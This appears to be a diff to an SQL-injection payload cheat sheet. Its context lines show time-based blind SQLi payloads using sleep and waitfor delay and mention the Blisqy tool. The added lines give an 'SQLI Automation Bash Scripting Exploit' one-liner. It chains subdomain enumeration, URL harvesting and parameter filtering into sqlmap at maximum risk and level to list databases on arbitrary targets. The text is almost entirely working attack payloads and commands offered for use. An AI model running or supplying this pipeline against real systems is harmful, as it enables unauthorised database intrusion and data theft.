@@ -40,3 +40,9 @@ Blisqy - Exploit Time-based blind-SQL injection in HTTP-Headers (MySQL/MariaDB)
 ')) or sleep(5)='
 ;waitfor delay '0:0:5'--
 );waitfor delay '0:0:5'--
+
+```
+#### SQLI Automation Bash Scripting Exploit :
+```
+cat target.txt | assetfinder | httpx -silent | waybackurls | tee -a potential.txt ; gf sqli potential.txt >> sqli.txt ; sqlmap -m sqli.txt --dbs --batch --risk 3 --level 3
+```
